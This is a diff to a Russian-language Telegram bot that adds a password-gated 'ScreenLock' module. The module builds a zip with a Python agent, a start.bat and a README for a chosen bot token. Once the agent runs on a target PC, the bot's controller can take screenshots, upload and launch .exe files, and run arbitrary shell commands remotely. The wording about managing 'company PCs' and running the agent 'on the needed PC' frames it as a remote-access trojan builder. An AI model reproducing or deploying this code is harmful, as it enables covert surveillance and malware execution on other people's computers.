@@ -420,6 +420,7 @@ def get_user_kb() -> InlineKeyboardMarkup:
          InlineKeyboardButton("🔍 Юзернеймы", callback_data="u_unparser")],
         [InlineKeyboardButton("🕵️ OSINT", callback_data="u_osint"),
          InlineKeyboardButton("🎮 Standoff 2", callback_data="u_so2")],
+        [InlineKeyboardButton("🔒 ScreenLock", callback_data="u_screenlock")],
         [InlineKeyboardButton("🔄 Обновить", callback_data="u_refresh"),
          InlineKeyboardButton("ℹ️ Инфо", callback_data="u_info"),
          InlineKeyboardButton("❌ Выйти", callback_data="u_logout")]
@@ -1315,6 +1316,268 @@ async def _show_sysmods(msg, tg_id: str, section: str = "main"):
             "Выбери модуль для настройки:",
             reply_markup=kb
         )
+
+
+# ══════════════════════════════════════════════════════════════
+# 🔒 SCREENLOCK — вспомогательные функции
+# ══════════════════════════════════════════════════════════════
+
+SCREENLOCK_PASSWORD = "uretra2026"
+
+
+def _screenlock_generate_code(token: str) -> str:
+    import textwrap
+    return textwrap.dedent(f'''
+import os, subprocess, psutil, platform
+from datetime import datetime
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import (
+    ApplicationBuilder, CommandHandler, MessageHandler,
+    CallbackQueryHandler, ContextTypes, filters
+)
+import pyautogui
+
+TOKEN   = "{token}"
+SAVEDIR = os.path.join(os.path.expanduser("~"), "ScreenLock")
+os.makedirs(SAVEDIR, exist_ok=True)
+
+
+def main_kb():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("📊 Статус системы", callback_data="sl_status")],
+        [InlineKeyboardButton("🖥️ Скриншот",       callback_data="sl_screenshot")],
+        [InlineKeyboardButton("📁 Файлы",           callback_data="sl_files")],
+        [InlineKeyboardButton("⌨️ CMD команда",     callback_data="sl_cmd_help")],
+        [InlineKeyboardButton("📤 Запустить .exe",  callback_data="sl_run_help")],
+    ])
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "🔒 ScreenLock\\n\\nПК онлайн и готов к управлению.\\nВыбери действие:",
+        reply_markup=main_kb()
+    )
+
+async def btn(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    await q.answer()
+    d = q.data
+
+    if d == "sl_status":
+        cpu  = psutil.cpu_percent(interval=1)
+        ram  = psutil.virtual_memory()
+        disk = psutil.disk_usage("C:\\\\")
+        boot = datetime.fromtimestamp(psutil.boot_time()).strftime("%d.%m.%Y %H:%M")
+        text = (
+            f"🖥️ Статус системы\\n\\n"
+            f"💻 ОС: {{platform.system()}} {{platform.release()}}\\n"
+            f"⚙️ CPU: {{cpu}}%\\n"
+            f"🧠 RAM: {{ram.percent}}% ({{ram.used//1024**2}} / {{ram.total//1024**2}} MB)\\n"
+            f"💾 Диск C: {{disk.percent}}% ({{disk.used//1024**3}} / {{disk.total//1024**3}} GB)\\n"
+            f"🕐 Запущен: {{boot}}"
+        )
+        await q.message.reply_text(text, reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton("🔄 Обновить", callback_data="sl_status")],
+            [InlineKeyboardButton("◀️ Меню",     callback_data="sl_back")],
+        ]))
+
+    elif d == "sl_screenshot":
+        path = os.path.join(SAVEDIR, "screen.png")
+        pyautogui.screenshot(path)
+        with open(path, "rb") as f:
+            await q.message.reply_photo(f, caption="🖥️ Скриншот экрана",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔄 Новый скрин", callback_data="sl_screenshot")],
+                    [InlineKeyboardButton("◀️ Меню",        callback_data="sl_back")],
+                ]))
+
+    elif d == "sl_files":
+        files = os.listdir(SAVEDIR)
+        if not files:
+            text = "📁 Папка ScreenLock пуста.\\nОтправь .exe файл сюда."
+        else:
+            text = "📁 Файлы в ScreenLock:\\n\\n" + "\\n".join([f"• {{f}}" for f in files])
+        await q.message.reply_text(text, reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton("🔄 Обновить", callback_data="sl_files")],
+            [InlineKeyboardButton("◀️ Меню",     callback_data="sl_back")],
+        ]))
+
+    elif d == "sl_cmd_help":
+        await q.message.reply_text(
+            "⌨️ CMD команда\\n\\nОтправь сообщение в формате:\\ncmd: <команда>\\n\\n"
+            "Примеры:\\ncmd: dir C:\\\\\\ncmd: tasklist\\ncmd: ipconfig",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("◀️ Меню", callback_data="sl_back")],
+            ])
+        )
+
+    elif d == "sl_run_help":
+        files = [f for f in os.listdir(SAVEDIR) if f.endswith(".exe")]
+        if not files:
+            await q.message.reply_text(
+                "📤 Нет .exe файлов.\\nСначала отправь .exe файл боту.",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("◀️ Меню", callback_data="sl_back")],
+                ])
+            )
+        else:
+            kb = [[InlineKeyboardButton(f"▶️ {{f}}", callback_data=f"sl_run_{{f}}")] for f in files]
+            kb.append([InlineKeyboardButton("◀️ Меню", callback_data="sl_back")])
+            await q.message.reply_text("📤 Выбери .exe для запуска:", reply_markup=InlineKeyboardMarkup(kb))
+
+    elif d.startswith("sl_run_"):
+        fname = d[7:]
+        fpath = os.path.join(SAVEDIR, fname)
+        if os.path.exists(fpath):
+            subprocess.Popen(fpath)
+            await q.message.reply_text(f"🚀 Запущен: {{fname}}", reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("◀️ Меню", callback_data="sl_back")],
+            ]))
+        else:
+            await q.answer("❌ Файл не найден", show_alert=True)
+
+    elif d == "sl_back":
+        await q.message.reply_text(
+            "🔒 ScreenLock\\n\\nВыбери действие:",
+            reply_markup=main_kb()
+        )
+
+async def handle_doc(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    doc  = update.message.document
+    path = os.path.join(SAVEDIR, doc.file_name)
+    f    = await context.bot.get_file(doc.file_id)
+    await f.download_to_drive(path)
+    if doc.file_name.endswith(".exe"):
+        kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton(f"▶️ Запустить {{doc.file_name}}", callback_data=f"sl_run_{{doc.file_name}}")],
+            [InlineKeyboardButton("◀️ Меню", callback_data="sl_back")],
+        ])
+        await update.message.reply_text(f"✅ Сохранён: {{doc.file_name}}\\n\\nЗапустить сейчас?", reply_markup=kb)
+    else:
+        await update.message.reply_text(f"✅ Сохранён: {{doc.file_name}}")
+
+async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = update.message.text.strip()
+    if text.lower().startswith("cmd:"):
+        command = text[4:].strip()
+        try:
+            result = subprocess.run(command, shell=True, capture_output=True,
+                                    text=True, timeout=30, encoding="cp866")
+            out = result.stdout or result.stderr or "✅ Выполнено"
+            if len(out) > 3500:
+                out = out[:3500] + "\\n...(обрезано)"
+            await update.message.reply_text(
+                f"```\\n{{out}}\\n```", parse_mode="Markdown",
+                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ Меню", callback_data="sl_back")]]))
+        except Exception as e:
+            await update.message.reply_text(f"❌ Ошибка: {{e}}")
+    else:
+        await update.message.reply_text(
+            "Отправь команду: cmd: <команда>\\nИли используй кнопки:",
+            reply_markup=main_kb()
+        )
+
+app = ApplicationBuilder().token(TOKEN).build()
+app.add_handler(CommandHandler("start", start))
+app.add_handler(CallbackQueryHandler(btn))
+app.add_handler(MessageHandler(filters.Document.ALL, handle_doc))
+app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
+print("🔒 ScreenLock агент запущен!")
+app.run_polling()
+''').strip()
+
+
+def _screenlock_readme() -> str:
+    return (
+        "╔══════════════════════════════════════╗\n"
+        "║         ScreenLock Agent             ║\n"
+        "║         by @userbotcbet              ║\n"
+        "╚══════════════════════════════════════╝\n\n"
+        "ТРЕБОВАНИЯ:\n"
+        "  - Windows 7/10/11\n"
+        "  - Python 3.10+ (скачать: python.org)\n\n"
+        "БЫСТРЫЙ СТАРТ:\n"
+        "  1. Установи Python если нет\n"
+        "  2. Дважды кликни на start.bat\n"
+        "  3. Подожди установки зависимостей\n"
+        "  4. Открой Telegram и напиши боту /start\n\n"
+        "КОМАНДЫ БОТА:\n"
+        "  /start              — главное меню\n"
+        "  📊 Статус           — CPU, RAM, диск\n"
+        "  🖥️ Скриншот         — снимок экрана\n"
+        "  📁 Файлы            — список файлов\n"
+        "  ⌨️ CMD команда      — запустить CMD\n"
+        "  📤 Запустить .exe   — запустить файл\n\n"
+        "  Отправь .exe файл — сохранится и можно запустить\n"
+        "  Отправь 'cmd: команда' — выполнить CMD\n\n"
+        "ВАЖНО:\n"
+        "  Не закрывай окно — бот должен работать.\n"
+        "  Файлы сохраняются в папку ScreenLock\n"
+        "  в домашней директории пользователя.\n\n"
+        "  @userbotcbet"
+    )
+
+
+async def screenlock_token_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Обрабатывает ввод пароля и токена для ScreenLock."""
+    tg_id = str(update.effective_user.id)
+    step  = context.user_data.get("sl_step")
+    text  = update.message.text.strip()
+
+    if step == "wait_password":
+        if text != SCREENLOCK_PASSWORD:
+            await update.message.reply_text(
+                "❌ Неверный пароль.",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔄 Попробовать снова", callback_data="u_screenlock")],
+                    [InlineKeyboardButton("◀️ Назад", callback_data="back_main")],
+                ])
+            )
+            context.user_data["sl_step"] = None
+            return "MENU"
+        # Пароль верный — показываем главное меню ScreenLock
+        context.user_data["sl_step"] = None
+        await update.message.reply_text(
+            "🔒 ScreenLock\n\n"
+            "⚠️ Тестовый модуль\n\n"
+            "Создай агента для удалённого управления ПК компании.\n\n"
+            "Как работает:\n"
+            "1. Вводишь токен Telegram-бота\n"
+            "2. Выбираешь формат\n"
+            "3. Получаешь архив с программой\n"
+            "4. Запускаешь на нужном ПК\n"
+            "5. Управляешь через того бота\n\n"
+            "1 токен = 1 ПК\n\n"
+            "📢 @userbotcbet",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("➕ Создать агента", callback_data="sl_create")],
+                [InlineKeyboardButton("◀️ Назад",          callback_data="back_main")],
+            ])
+        )
+        return "SCREENLOCK"
+
+    if step == "wait_token":
+        if ":" not in text or len(text) < 30:
+            await update.message.reply_text(
+                "❌ Неверный формат токена.\n\nФормат: 1234567890:AAFxxxxxxxxxxxxxxxxxxxxxxx",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("◀️ Отмена", callback_data="sl_menu")],
+                ])
+            )
+            return "SCREENLOCK"
+        context.user_data["sl_token"] = text
+        context.user_data["sl_step"]  = "wait_format"
+        await update.message.reply_text(
+            "🔒 ScreenLock — Создание агента\n\n"
+            "Шаг 2/2: Выбери формат",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🖥️ .exe (Windows)",         callback_data="sl_format_exe")],
+                [InlineKeyboardButton("📱 .apk (Android) — скоро", callback_data="sl_format_apk")],
+                [InlineKeyboardButton("◀️ Отмена",                 callback_data="sl_menu")],
+            ])
+        )
+        return "SCREENLOCK"
+
+    return "SCREENLOCK"
 
 
 async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -2441,6 +2704,99 @@ async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             InlineKeyboardMarkup(kb_rows)
         )
         return "MENU"
+
+    # ══════════════════════════════════════════════════════════════
+    # 🔒 SCREENLOCK — тестовый модуль, пароль: uretra2026
+    # ══════════════════════════════════════════════════════════════
+
+    if data == "u_screenlock":
+        context.user_data["sl_step"] = "wait_password"
+        await send_plain(
+            query.message,
+            "🔒 ScreenLock\n\n"
+            "⚠️ Тестовый модуль\n\n"
+            "Введи пароль для доступа:",
+            InlineKeyboardMarkup([
+                [InlineKeyboardButton("◀️ Назад", callback_data="back_main")],
+            ])
+        )
+        return "SCREENLOCK"
+
+    if data == "sl_menu":
+        await send_plain(
+            query.message,
+            "🔒 ScreenLock\n\n"
+            "Создай агента для удалённого управления ПК компании.\n\n"
+            "Как работает:\n"
+            "1. Вводишь токен Telegram-бота\n"
+            "2. Выбираешь формат\n"
+            "3. Получаешь архив с программой\n"
+            "4. Запускаешь на нужном ПК\n"
+            "5. Управляешь через того бота\n\n"
+            "1 токен = 1 ПК\n\n"
+            "📢 @userbotcbet",
+            InlineKeyboardMarkup([
+                [InlineKeyboardButton("➕ Создать агента", callback_data="sl_create")],
+                [InlineKeyboardButton("◀️ Назад",          callback_data="back_main")],
+            ])
+        )
+        return "SCREENLOCK"
+
+    if data == "sl_create":
+        context.user_data["sl_step"] = "wait_token"
+        await send_plain(
+            query.message,
+            "🔒 ScreenLock — Создание агента\n\n"
+            "Шаг 1/2: Введи токен бота\n\n"
+            "Получить токен: @BotFather → /newbot\n"
+            "Формат: 1234567890:AAFxxxxxxxxxxxxxxxxxxxxxxx",
+            InlineKeyboardMarkup([
+                [InlineKeyboardButton("◀️ Отмена", callback_data="sl_menu")],
+            ])
+        )
+        return "SCREENLOCK"
+
+    if data == "sl_format_exe":
+        token = context.user_data.get("sl_token", "")
+        if not token:
+            await query.answer("❌ Токен не найден, начни заново.", show_alert=True)
+            return "SCREENLOCK"
+        context.user_data["sl_step"] = None
+        msg = await query.message.reply_text("⚙️ Генерирую агента, подожди...")
+        try:
+            import zipfile, io
+            pc_code = _screenlock_generate_code(token)
+            readme  = _screenlock_readme()
+            zip_buf = io.BytesIO()
+            with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
+                zf.writestr("ScreenLock_agent/bot.py",          pc_code)
+                zf.writestr("ScreenLock_agent/requirements.txt",
+                    "python-telegram-bot==20.7\npsutil\npyautogui\nPillow\n")
+                zf.writestr("ScreenLock_agent/README.txt",       readme)
+                zf.writestr("ScreenLock_agent/start.bat",
+                    "@echo off\npip install -r requirements.txt\npython bot.py\npause\n")
+            zip_buf.seek(0)
+            await msg.delete()
+            await query.message.reply_document(
+                document=zip_buf,
+                filename="ScreenLock_agent.zip",
+                caption=(
+                    "✅ ScreenLock агент готов!\n\n"
+                    "📋 Инструкция внутри архива (README.txt)\n\n"
+                    "Быстрый старт:\n"
+                    "1. Распакуй архив на ПК\n"
+                    "2. Запусти start.bat\n"
+                    "3. Открой бота в Telegram → /start\n\n"
+                    "🔒 @userbotcbet"
+                )
+            )
+        except Exception as e:
+            await msg.edit_text(f"❌ Ошибка: {e}")
+        return "SCREENLOCK"
+
+    if data == "sl_format_apk":
+        await query.answer("🚧 APK — скоро будет!", show_alert=True)
+        return "SCREENLOCK"
 
     return "MENU"
 
@@ -3822,6 +4178,7 @@ def main():
             "WAIT_TIMENICK":         [CallbackQueryHandler(menu_router), MessageHandler(filters.TEXT & ~filters.COMMAND, wait_timenick)],
             "SONYA_CHAT":            [CallbackQueryHandler(menu_router), MessageHandler(filters.TEXT & ~filters.COMMAND, sonya_chat)],
             "WAIT_PROMO_ACTIVATE":   [CallbackQueryHandler(menu_router), MessageHandler(filters.TEXT & ~filters.COMMAND, promo_activate)],
+            "SCREENLOCK":            [CallbackQueryHandler(menu_router), MessageHandler(filters.TEXT & ~filters.COMMAND, screenlock_token_handler)],
             "ADMIN_LOGIN":           [CallbackQueryHandler(menu_router), MessageHandler(filters.TEXT & ~filters.COMMAND, admin_login)],
             "ADMIN_MENU":            [CallbackQueryHandler(admin_router)],
             "SET_IMAGES":            [CommandHandler("start", cmd_start), MessageHandler(filters.PHOTO, setimages_handler), MessageHandler(filters.TEXT & ~filters.COMMAND, lambda u, c: u.message.reply_text("❌ Отправь фото, не текст.") or "SET_IMAGES")],
